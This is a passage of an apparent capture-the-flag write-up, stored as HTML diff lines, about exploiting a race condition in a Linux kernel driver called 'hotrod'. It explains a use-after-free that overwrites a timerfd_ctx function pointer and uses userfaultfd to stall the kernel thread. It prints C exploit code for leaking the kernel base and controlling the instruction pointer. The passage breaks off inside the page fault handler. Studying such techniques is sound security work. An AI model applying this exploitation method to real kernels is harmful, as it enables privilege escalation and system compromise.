+<p>The old <code class="highlighter-rouge">ioctl()</code> implementation ran under <a href="http://en.wikipedia.org/wiki/Giant_lock">Big Kernel Lock</a>. From <a href="https://lwn.net/Articles/119652/">The new way of ioctl()</a>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ioctl() is one of the remaining parts of the kernel which runs under the Big Kernel Lock (BKL).
+In the past, the usage of the BKL has made it possible for long-running ioctl()
+methods to create long latencies for unrelated processes.
+</code></pre></div></div>
+
+<p>Of course this was really inefficient in SMP environment, because during ioctl operations nothing else could be executed, therefore, two new functions have been introduced: <code class="highlighter-rouge">unlocked_ioctl()</code> and <code class="highlighter-rouge">compat_ioctl()</code>. In kernel version 2.6.36, the old ioctl implementation has been completely removed, as we can see from <a href="https://lwn.net/Articles/394724/">kill .ioctl file_operation</a>.</p>
+
+<p>From <strong>The new way of ioctl()</strong> we can also understand the difference between the old and the new <code class="highlighter-rouge">ioctl()</code> implementation:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>If a driver or filesystem provides an unlocked_ioctl() method, it will be called in preference to the older ioctl().
+The differences are that the inode argument is not provided (it's available as filp-&gt;f_dentry-&gt;d_inode)
+and the BKL is not taken prior to the call.
+All new code should be written with its own locking, and should use unlocked_ioctl().
+</code></pre></div></div>
+
+<p>This completely changes the situation for us, opening new exploitation paths, because hotrod is using <code class="highlighter-rouge">unlocked_ioctl()</code> but <strong>it is not using its own locking</strong>!</p>
+
+<p>It means that <strong>using two threads, we can exploit a race condition that will cause an Use After Free, leading to arbitrary code execution</strong>.</p>
+
+<p>A basic idea can be the following: Let’s assume that we can use <strong>Alloc</strong> to get an allocation in kmalloc-256 and find a way to get a leak using <strong>Show</strong>. Then we can use <strong>Edit</strong> to copy our buffer from user space to the allocated memory region in kernel space. At same time, with another thread, we use <strong>Free</strong> to deallocate the object, then we allocate a structure of a specific size, so it will be allocated in the same place. In this way the <strong>Edit</strong> operation will hopefully overwrite function pointers in the structure causing a UAF and we will be able to hijack the kernel instruction pointer.</p>
+
+<p>Of course, to succeed in this plan, we need two elements:</p>
+
+<ul>
+  <li>A structure allocated in kmalloc-256: it will allow us to get a memory leak and
+  hopefully to control the kernel instruction pointer.</li>
+  <li>A way to make our race condition reliable: we can perform each action only once, so we need to find a way to maximize the success rate of the race condition.</li>
+</ul>
+
+<h3 id="the-structure---timerfd_ctx">The structure - timerfd_ctx</h3>
+
+<p>As we can see from <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">this</a> useful article, an interesting structure allocated in kmalloc-256 cache, is <a href="https://elixir.bootlin.com/linux/v5.8.3/source/fs/timerfd.c#L31">timerfd_ctx</a>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">timerfd_ctx</span>
+<span class="p">{</span>
+  <span class="k">union</span>
+  <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">hrtimer</span> <span class="n">tmr</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">alarm</span> <span class="n">alarm</span><span class="p">;</span>
+  <span class="p">}</span> <span class="n">t</span><span class="p">;</span>
+  <span class="n">ktime_t</span> <span class="n">tintv</span><span class="p">;</span>
+  <span class="n">ktime_t</span> <span class="n">moffs</span><span class="p">;</span>
+  <span class="n">wait_queue_head_t</span> <span class="n">wqh</span><span class="p">;</span>
+  <span class="n">u64</span> <span class="n">ticks</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">clockid</span><span class="p">;</span>
+  <span class="kt">short</span> <span class="kt">unsigned</span> <span class="n">expired</span><span class="p">;</span>
+  <span class="kt">short</span> <span class="kt">unsigned</span> <span class="n">settime_flags</span><span class="p">;</span>	<span class="cm">/* to show in fdinfo */</span>
+  <span class="k">struct</span> <span class="n">rcu_head</span> <span class="n">rcu</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">list_head</span> <span class="n">clist</span><span class="p">;</span>
+  <span class="n">spinlock_t</span> <span class="n">cancel_lock</span><span class="p">;</span>
+  <span class="n">bool</span> <span class="n">might_cancel</span><span class="p">;</span>
+<span class="p">};</span></code></pre></figure>
+
+<p>The structure in the union are respectively a <a href="https://elixir.bootlin.com/linux/v4.19.65/source/include/linux/hrtimer.h#L110">hrtimer</a> structure:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">hrtimer</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">timerqueue_node</span> <span class="n">node</span><span class="p">;</span> <span class="c1">// timerqueue node, which also manages node.expires
+</span>  <span class="n">ktime_t</span> <span class="n">_softexpires</span><span class="p">;</span> <span class="c1">// the absolute earliest expiry time of the hrtimer.
+</span>  <span class="k">enum</span> <span class="n">hrtimer_restart</span> <span class="p">(</span><span class="o">*</span><span class="n">function</span><span class="p">)(</span><span class="k">struct</span> <span class="n">hrtimer</span> <span class="o">*</span><span class="p">);</span> <span class="c1">// timer expiry callback function
+</span>  <span class="k">struct</span> <span class="n">hrtimer_clock_base</span> <span class="o">*</span><span class="n">base</span><span class="p">;</span> <span class="c1">// pointer to the timer base (per cpu and per clock)
+</span>  <span class="n">u8</span> <span class="n">state</span><span class="p">;</span> <span class="c1">// state information (See bit values above)
+</span>  <span class="n">u8</span> <span class="n">is_rel</span><span class="p">;</span> <span class="c1">// Set if the timer was armed relative
+</span>  <span class="n">u8</span> <span class="n">is_soft</span><span class="p">;</span> <span class="c1">// Set if hrtimer will be expired in soft interrupt context.
+</span><span class="p">};</span></code></pre></figure>
+
+<p>And an <a href="https://elixir.bootlin.com/linux/v4.19.65/source/include/linux/alarmtimer.h#L41">alarm</a> structure:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">alarm</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">timerqueue_node</span> <span class="n">node</span><span class="p">;</span> <span class="c1">// timerqueue node adding to the event list this value also includes the expiration time.
+</span>  <span class="k">struct</span> <span class="n">hrtimer</span> <span class="n">timer</span><span class="p">;</span> <span class="c1">// hrtimer used to schedule events while running
+</span>  <span class="k">enum</span> <span class="n">alarmtimer_restart</span> <span class="p">(</span><span class="o">*</span><span class="n">function</span><span class="p">)(</span><span class="k">struct</span> <span class="n">alarm</span> <span class="o">*</span><span class="p">,</span> <span class="n">ktime_t</span> <span class="n">now</span><span class="p">);</span> <span class="c1">// Function pointer to be executed when the timer fires.
+</span>  <span class="k">enum</span> <span class="n">alarmtimer_type</span> <span class="n">type</span><span class="p">;</span> <span class="c1">// Alarm type (BOOTTIME/REALTIME).
+</span>  <span class="kt">int</span> <span class="n">state</span><span class="p">;</span> <span class="c1">// Flag that represents if the alarm is set to fire or not.
+</span>  <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span> <span class="c1">// Internal data value.
+</span><span class="p">};</span></code></pre></figure>
+
+<p>This object is allocated every time we use <a href="https://linux.die.net/man/2/timerfd_create">timerfd_create()</a> to create a timer instance.
+The timerfd_ctx structure is good a choice for us, because it allow to leak kernel function pointers and kernel heap addresses. Is important to note that the structure is freed using  <a href="https://elixir.bootlin.com/linux/v5.8.3/source/include/linux/rcupdate.h#L845">kfree_rcu</a>. <code class="highlighter-rouge">kfree_rcu()</code> will deallocate the object using <code class="highlighter-rouge">kfree()</code> after a grace period to ensure the object is no longer used by any thread. We can simply avoid this problem using <code class="highlighter-rouge">sleep(1)</code> after freeing the object to make sure it has actually been freed, then we can use <strong>Alloc</strong> and <strong>Show</strong> to leak pointers.</p>
+
+<p>Another important detail is that when the timer expires, the third field in the <code class="highlighter-rouge">hrtime</code> structure, the function pointer (<a href="https://elixir.bootlin.com/linux/v4.19.65/source/fs/timerfd.c#L73">timerfd_tmrproc</a>), is executed. This means that <strong>if we cause a UAF and then we overwrite the function pointer, we will be able to control the kernel instruction pointer once the timer expires!</strong></p>
+
+<p>Here’s timerfd_ctx in memory. We are interested in the highlighted fields:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffff888000297900:  0xffff888000297900 [1]    0x0000000000000000  
+0xffff888000297910:  0x0000000000000000        0x00000002ef81037a [2]             
+0xffff888000297920:  0x00000002ef81037a [3]    0xffffffff81102a00 [4]
+0xffff888000297930:  0xffffffff8183e080        0x0000000000000000      
+0xffff888000297940:  0x0000000000000000        0x0000000000000000      
+0xffff888000297950:  0x0000000000000000        0x0000000000000000      
+0xffff888000297960:  0x0000000000000000        0x0000000000000000      
+0xffff888000297970:  0x0000000000000000        0x0000000000000000      
+0xffff888000297980:  0xbdbbd3bf6c2a6d81        0xffff888000297988      
+0xffff888000297990:  0xffff888000297988        0x0000000000000000      
+0xffff8880002979a0:  0x0000000000000000        0xffff88800013eb00      
+0xffff8880002979b0:  0x00000000000000a8        0x0000000000000000      
+0xffff8880002979c0:  0x0000000000000000        0x0000000000000000      
+0xffff8880002979d0:  0x0000000000000000        0x0000000000000000      
+0xffff8880002979e0:  0x0000000000000000        0x0000000000000000
+</code></pre></div></div>
+
+<h3 id="optimize-the-race-condition---userfaultfd">Optimize the race condition - userfaultfd</h3>
+<p>At this point we have the structure. Now we need to find a way to make the race condition reliable.</p>
+
+<p>To succeed in our goal, we can take advantage of a feature of the Linux kernel: <a href="https://www.kernel.org/doc/html/latest/admin-guide/mm/userfaultfd.html">Usefaultfd</a>. This feature, allows user space processes to handle page faults and other memory management tasks. For example it can be useful to <a href="https://makedist.com/posts/2016/10/10/measuring-userfaultfd-page-fault-latency/">measure page fault latency</a>, but it also has a dark side.</p>
+
+<p>We can start monitoring a specific memory range, let’s say a page of memory, waiting for page faults. When the kernel will try to access that page, it will cause a page fault and the control will be transferred to the page faults handler (our process in user space). <strong>This will give us the ability to suspend the kernel thread for N seconds and eventually exploit a race condition that will lead to arbitrary code execution!</strong></p>
+
+<h3 id="the-plan">The plan</h3>
+<p>Now that we have all the pieces of the puzzle, we can reformulate our plan in the following way:</p>
+
+<p>To get a memory leak, we can allocate a <code class="highlighter-rouge">timerfd_ctx</code> structure using <code class="highlighter-rouge">timerfd_create()</code>, then we can close the file descriptor associated with the object, so the structure will be freed. Then, using <strong>Alloc</strong> we can get an allocation in the same place and using <strong>Show</strong> we can leak the <code class="highlighter-rouge">timerfd_tmrproc</code> pointer that will allow us to compute kernel base address.</p>
+
+<p>To control the kernel instruction pointer, let’s see what happens when we use <strong>Edit</strong>:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">[...]</span>
+<span class="k">case</span> <span class="n">EDIT</span><span class="p">:</span>
+<span class="p">{</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">edited</span> <span class="o">&amp;&amp;</span> <span class="n">hotrod</span><span class="p">.</span><span class="n">size</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">edited</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">hotrod</span><span class="p">.</span><span class="n">content</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="n">user_req</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span> <span class="c1">// [1]
+</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">req</span><span class="p">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="n">hotrod</span><span class="p">.</span><span class="n">size</span> <span class="p">)</span>
+      <span class="p">{</span>
+          <span class="n">copy_from_user</span><span class="p">(</span><span class="n">hotrod</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="n">req</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="n">req</span><span class="p">.</span><span class="n">size</span><span class="p">);</span> <span class="c1">// [2]
+</span>          <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+
+  <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">[...]</span></code></pre></figure>
+
+<p>the kernel copies the user request from user space to kernel space using <code class="highlighter-rouge">copy_from_user()</code> <strong>[1]</strong>. Then, after a size check, with a second call to <code class="highlighter-rouge">copy_from_user()</code>, the kernel copies <code class="highlighter-rouge">req.size</code> bytes from <code class="highlighter-rouge">req.content</code> to the memory region we have previously allocated using <strong>Alloc</strong> <strong>[2]</strong>.</p>
+
+<p>This means that we can map a memory region to use as <code class="highlighter-rouge">req.content</code>:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdead000</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span></code></pre></figure>
+
+<p>then we can create a thread that will start monitoring the mapped region using userfaultfd, waiting for a page fault. It will be our <strong>Page Faults Handler</strong> (PFH). Once the PFH is running, from the main thread, we can use <strong>Edit</strong> to force the kernel to access <code class="highlighter-rouge">req.content</code> causing a page fault <strong>[2]</strong>.
+At this point the control will be transferred to the PFH and we will be able to suspend the faulting thread. Now, always with ours PFH, we can</p>
+
+<ul>
+  <li>Use <strong>Free</strong> to deallocate the previously allocated object.</li>
+  <li>Create a timer that will allocate another <code class="highlighter-rouge">timerfd_ctx</code> structure in the same place (remember that freelists work in a LIFO manner).</li>
+  <li>Release the faulting thread that will overwrite the structure in memory.</li>
+</ul>
+
+<p>Once the timer expires, we will be able to control the kernel instruction pointer!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                       +
+                       |
+                       |
+            +----------v----------+
+            |    create_timer()   |    +------+
+            +----------+----------+           |
+                       |                      |
+                       |                      |
+            +----------v----------+           |
+            |      do_alloc()     |           +----&gt;  Leak
+            +----------+----------+           |
+                       |                      |
+                       |                      |
+            +----------v----------+           |
+            |      do_show()      |    +------+
+            +----------+----------+
+                       |
+                       |
+            +----------v----------+
+            |   pthread_create()  +--------------------------+
+            +----------+----------+                          |
+                       |                                     |
+                       |                          +----------v----------+
+                       |                          |    userfaultfd()    |
+                       |                          +----------+----------+
+                       |                                     |
+                       |                                     |
+                       |                          +---------&gt;+
+                       |                          |          |
+                       |                          |          |
+                       |                          |   ... polling ...
+                       |                          |          |
+            +----------v----------+               |          |
+            |      do_edit()      |               +----------+
+            +----------+----------+                          |
+                       |                                     |
+                       X                                 PAGE FAULT         +------+
+                                                             |                     |
+                                                             |                     |
+                                                  +----------v----------+          |
+                                                  |      do_free()      |          |
+                                                  +----------+----------+          |
+                                                             |                     |
+                                                             |                     |
+                                                  +----------v----------+          |
+                                                  |    create_timer()   |          +---&gt;  Handle PF            
+                                                  +----------+----------+          |
+                                                             |                     |
+                                                             |                     |
+                                                  +----------v----------+          |
+                                                  |      ioctl_ufd()    |          |
+                                                  +----------+----------+          |
+                                                             |                     |
+                                                             |                     |
+                       X                                  RELEASE           +------+
+                       |
+            +----------v----------+
+            | Edit complete (UAF) |
+            +---------------------+
+
+</code></pre></div></div>
+<h3 id="the-exploit---controlling-rip">The exploit - Controlling RIP</h3>
+
+<p>We can start writing the helper functions to interact with the device.
+Since we have ascertained that allocations in range 0xe0-0xf0 will go in kmalloc-256, we can use an arbitrary allocation size of 0xf0 bytes.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define DEVICE_PATH "/dev/hotrod"
+</span>
+<span class="cp">#define ALLOC 0xBAADC0DE
+#define FREE 0xC001C0DE
+#define SHOW 0x1337C0DE
+#define EDIT 0xDEADC0DE
+</span>
+<span class="cp">#define PAGE_SIZE 0x1000
+</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">ufd</span><span class="p">;</span>
+<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span> <span class="o">=</span> <span class="mh">0xf0</span><span class="p">;</span>
+<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mh">0xf0</span><span class="p">];</span>
+<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">kernel_base</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="n">timerfd_ctx</span><span class="p">,</span> <span class="n">pivot</span><span class="p">;</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="n">page</span><span class="p">;</span>
+
+<span class="k">struct</span> <span class="n">request</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">;</span>
+<span class="p">};</span>
+
+
+<span class="kt">void</span> <span class="nf">hexdump</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="o">/</span><span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">%</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+      <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"  </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  %04x  "</span><span class="p">,</span> <span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">);</span>
+      <span class="p">}</span>
+
+      <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ptr</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">buff</span><span class="p">))[</span><span class="n">i</span><span class="p">];</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"0x%016lx"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"    "</span><span class="p">);</span>
+
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span> <span class="nf">do_alloc</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">ALLOC</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span> <span class="nf">do_free</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">FREE</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span> <span class="nf">do_show</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">request</span> <span class="n">req</span><span class="p">;</span>
+
+  <span class="n">req</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+  <span class="n">req</span><span class="p">.</span><span class="n">buff</span> <span class="o">=</span> <span class="n">dest</span><span class="p">;</span>
+
+  <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">SHOW</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+<span class="kt">void</span> <span class="nf">do_edit</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">request</span> <span class="n">req</span><span class="p">;</span>
+
+  <span class="n">req</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+  <span class="n">req</span><span class="p">.</span><span class="n">buff</span> <span class="o">=</span> <span class="n">src</span><span class="p">;</span>
+
+  <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">EDIT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>To create a timer instance, we can use:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">create_timer</span><span class="p">(</span><span class="kt">int</span> <span class="n">leak</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">itimerspec</span> <span class="n">its</span><span class="p">;</span>
+
+  <span class="n">its</span><span class="p">.</span><span class="n">it_interval</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">its</span><span class="p">.</span><span class="n">it_interval</span><span class="p">.</span><span class="n">tv_nsec</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">its</span><span class="p">.</span><span class="n">it_value</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+  <span class="n">its</span><span class="p">.</span><span class="n">it_value</span><span class="p">.</span><span class="n">tv_nsec</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">tfd</span> <span class="o">=</span> <span class="n">timerfd_create</span><span class="p">(</span><span class="n">CLOCK_REALTIME</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">timerfd_settime</span><span class="p">(</span><span class="n">tfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">its</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">tfd</span><span class="p">);</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Then we can proceed writing the function to initialize userfaultfd:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">userfaultfd</span><span class="p">(</span><span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_userfaultfd</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="nf">initialize_ufd</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Mmapping page..."</span><span class="p">);</span>
+  <span class="n">page</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdead000</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+  <span class="k">struct</span> <span class="n">uffdio_register</span> <span class="n">reg</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">userfaultfd</span><span class="p">(</span><span class="n">O_NONBLOCK</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">perror</span><span class="p">(</span><span class="s">"[ERROR] Userfaultfd failed"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">struct</span> <span class="n">uffdio_api</span> <span class="n">api</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">api</span> <span class="o">=</span> <span class="n">UFFD_API</span> <span class="p">};</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">UFFDIO_API</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">api</span><span class="p">))</span>
+  <span class="p">{</span>
+    <span class="n">perror</span><span class="p">(</span><span class="s">"[ERROR] ioctl - UFFDIO_API failed"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">api</span><span class="p">.</span><span class="n">api</span> <span class="o">!=</span> <span class="n">UFFD_API</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"[ERROR] Unexepcted UFFD api version!"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Start monitoring range: %p - %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">page</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span><span class="p">);</span>
+
+  <span class="n">reg</span><span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="n">UFFDIO_REGISTER_MODE_MISSING</span><span class="p">;</span>
+  <span class="n">reg</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">start</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="n">page</span><span class="p">);</span>
+  <span class="n">reg</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">UFFDIO_REGISTER</span><span class="p">,</span>  <span class="o">&amp;</span><span class="n">reg</span><span class="p">))</span>
+  <span class="p">{</span>
+    <span class="n">perror</span><span class="p">(</span><span class="s">"[ERROR] ioctl - UFFDIO_REGISTER failed"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>And the page fault handler:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="o">*</span><span class="nf">page_fault_handler</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">_ufd</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">pollfd</span> <span class="n">pollfd</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">uffd_msg</span> <span class="n">fault_msg</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">uffdio_copy</span> <span class="n">ufd_copy</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">ufd</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span> <span class="n">_ufd</span><span class="p">);</span>
+
+  <span class="n">pollfd</span><span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="n">ufd</span><span class="p">;</span>
+  <span class="n">pollfd</span><span class="p">.</span><span class="n">events</span> <span class="o">=</span> <span class="n">POLLIN</span><span class="p">;</span>
+
+  <span class="k">while</span> <span class="p">(</span><span class="n">poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pollfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+  <span class="p">{</span>
+
